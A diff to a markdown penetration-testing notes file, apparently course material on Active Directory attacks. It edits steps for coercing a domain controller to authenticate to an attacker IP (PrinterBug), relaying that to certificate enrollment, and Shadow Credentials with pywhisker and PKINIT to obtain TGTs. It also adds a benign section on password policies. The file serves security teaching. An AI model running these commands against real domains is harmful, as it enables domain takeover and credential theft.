@@ -5741,8 +5741,6 @@ python3 printerbug.py <CORP.LOCAL>/<USER>:"<USER>"@<DC01_IP> <ATTACKER_IP>
 # [*] Attempting to trigger authentication via rprn RPC at <DC01_IP>
 # [*] Bind OK
 # [*] Got handle
-# RPRN SessionError: code: 0x6ba - RPC_S_SERVER_UNAVAILABLE - The RPC server is unavailable.
-# [*] Triggered RPC backconnect, this may or may not have worked
 ```
 
 Referring back to `ntlmrelayx`, we can see from the output that the authentication request was successfully relayed to the web enrollment application, and a certificate was issued for **DC01$**:
@@ -5787,7 +5785,8 @@ We can now perform a Pass-the-Certificate attack to obtain a TGT as DC01$. One w
 **Install oscrypto**
 
 ```bash
-pip3 install -I git+https://github.com/wbond/oscrypto.git
+sudo apt update
+sudo apt install python3-oscrypto
 ```
 
 **Clone the repository and install the dependencies**
@@ -5865,9 +5864,9 @@ pywhisker --dc-ip <DC01_IP> -d <CORP.LOCAL> -u wwhite -p '<PASSWORD>' --target <
 # [+] Updated the msDS-KeyCredentialLink attribute of the target object
 # [*] Converting PEM -> PFX with cryptography: eFUVVTPf.pfx
 # [+] PFX exportiert nach: eFUVVTPf.pfx
-# [i] Passwort für PFX: bmRH4LK7UwPrAOfvIx6W
+# [i] Passwort für PFX: <PFX_PASS>
 # [+] Saved PFX (#PKCS12) certificate & key at path: eFUVVTPf.pfx
-# [*] Must be used with password: bmRH4LK7UwPrAOfvIx6W
+# [*] Must be used with password: <PFX_PASS>
 # [*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
 ```
 
@@ -5876,7 +5875,7 @@ In the output above, we can see that a PFX (PKCS12) file was created (`eFUVVTPf.
 **Use this file with `gettgtpkinit.py` to acquire a TGT as the victim**
 
 ```bash
-python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip <DC01_IP> CORP.LOCAL/<USER> /tmp/<USER>.ccache
+python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass '<PFX_PASS>' -dc-ip <DC01_IP> CORP.LOCAL/<USER> /tmp/<USER>.ccache
 ```
 
 **Expected Output**
@@ -5946,6 +5945,107 @@ In certain environments, an attacker may be able to obtain a certificate but be 
 Now that we've seen how to perform various lateral movement techniques from Windows and Linux hosts, we'll pivot to a new focus: password management.
 
 </details>
+
+</details>
+
+</details>
+
+<details>
+<summary><h1>🔐 Password Management</h1></summary>
+
+<details>
+<summary><h2>Password Policies</h2></summary>
+
+Now that we've explored various techniques for capturing credentials and passwords, it's time to shift focus to best practices for **password and identity protection**.
+
+Just as speed limits and traffic laws promote safe driving, **security policies** guide users toward responsible behavior in digital environments. Without these policies, organizations risk chaos—users might act without oversight or consideration for consequences.
+
+This is why **administrators and service providers establish and enforce clear security policies**: to maintain order, reduce risk, and protect systems and identities from compromise.
+
+<details>
+<summary><h3>Password policy</h3></summary>
+
+A password policy is a set of rules aimed at strengthening computer security by guiding users to create and manage strong passwords in line with organizational standards. Its scope goes beyond setting minimum requirements—it covers the entire password lifecycle, including:
+
+* Creation
+* Storage,
+* Management
+* Transmission
+
+<details>
+<summary><h4>Password policy standards</h4></summary>
+
+Due to compliance requirements and industry best practices, many organizations follow established IT security standards. While these standards don’t guarantee complete protection, they provide a widely accepted baseline for implementing security controls. However, it's important to recognize that compliance alone should not be the sole indicator of a strong security posture.
+
+Many of these standards include guidance on password policies. Some of the most common include:
+
+* [NIST SP800-63B](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-63b.pdf)
+* [CIS Password Policy Guide](https://www.cisecurity.org/insights/white-papers/cis-password-policy-guide)
+* [PCI DSS](https://www.pcisecuritystandards.org/document_library/?category=pcidss&document=pci_dss)
+
+Each standard offers a different perspective on password security, and reviewing them can help inform the development of a strong, customized password policy. One area where these standards often diverge is in their approach to **password expiration**.
+
+Historically, many organizations enforced rules like “*change your password every 90 days*” in the name of security. However, modern guidance is shifting away from this approach. Today, many standards recommend disabling periodic password expiration, as it tends to encourage users to choose weaker, more predictable passwords. Instead, password changes are typically recommended only after a known or suspected compromise.
+
+</details>
+
+<details>
+<summary><h4>Sample password policy</h4></summary>
+
+To illustrate important considerations, here is a sample password policy. It requires that all passwords:
+
+* Minimum of 8 characters.
+* Include uppercase and lowercase letters.
+* Include at least one number.
+* Include at least one special character.
+* It should not be the username.
+* It should be changed every 60 days.
+
+We should include certain blacklisted words in our password policies. These may include, but are not limited to:
+
+* The company's name
+* Common words associated with the company
+* Names of months
+* Names of seasons
+* Variations on the words "welcome" and "password"
+* Common and easily guessable words such as "password", "123456", and "abcde"
+
+</details>
+
+<details>
+<summary><h4>Enforcing password policy</h4></summary>
+
+A password policy outlines how passwords should be created, managed, and stored within an organization. To be effective, this policy must be enforced through available technology or by implementing appropriate tools. Most modern applications and identity management systems include features to help enforce password policies.
+
+For example, if the organization uses Active Directory for authentication, an [Active Directory Password Policy GPO](https://activedirectorypro.com/how-to-configure-a-domain-password-policy/) can be configured to ensure users follow the defined guidelines.
+
+Once the technical controls are in place, the policy must be communicated across the organization. From there, processes and procedures should be established to ensure consistent enforcement of the policy in all relevant systems and environments.
+
+</details>
+
+<details>
+<summary><h4>Creating a strong password</h4></summary>
+
+**Password Generators**
+
+This tools can generate secure passwords:
+
+* [1password](https://1password.com/password-generator)
+* [Proton Password Generator](https://proton.me/pass/password-generator)
+
+**Password Evaluators**
+
+This tools evaluate the strength of passwords:
+
+* [PasswordMonster](https://www.passwordmonster.com/)
+
+
+</details>
+
+</details>
+
+<details>
+<summary><h2>Password Managers</h2></summary>
 
 </details>
 
